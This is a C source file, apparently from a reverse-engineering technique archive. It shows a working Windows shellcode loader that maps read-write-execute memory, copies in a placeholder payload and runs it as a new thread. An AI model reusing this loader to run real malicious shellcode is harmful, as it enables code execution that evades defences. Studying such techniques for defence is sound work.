/*
    Shellcode Loader
    Archive of Reversing.ID

    Allocating new page and write shellcode into it.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: CreateFileMapping + MapViewOfFile/MapViewOfFileEx
    - writing:    RtlMoveMemory
    - permission: 
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>

// for MapViewOfFileNuma2 and derivative (MapViewOfFile2/MapViewOfFile2)
#pragma comment(lib,"onecoreuap")


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;
    HANDLE  mapfile;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE-EXECUTE (RWX)
    // note: need research to make it RW at first and then change it to RX
    mapfile = CreateFileMapping (INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)payload_len, NULL);

    // -- alternative of map view --
    runtime = MapViewOfFile (mapfile, FILE_MAP_ALL_ACCESS|FILE_MAP_EXECUTE, 0, 0, payload_len);
    // runtime = MapViewOfFileEx (mapfile, FILE_MAP_ALL_ACCESS|FILE_MAP_EXECUTE, 0, 0, payload_len, NULL);
    // runtime = MapViewOfFile2 (mapfile, GetCurrentProcess(), NULL, 0, 0, 0, PAGE_EXECUTE_READWRITE);
    // runtime = MapViewOfFile3 (mapfile, GetCurrentProcess(), NULL, 0, 0, 0, PAGE_EXECUTE_READWRITE, NULL, 0);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // execute as new thread
    h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
    WaitForSingleObject (h_thread, -1);

    // deallocate the space
    UnmapViewOfFile (runtime);
    CloseHandle (mapfile);

    return 0;
}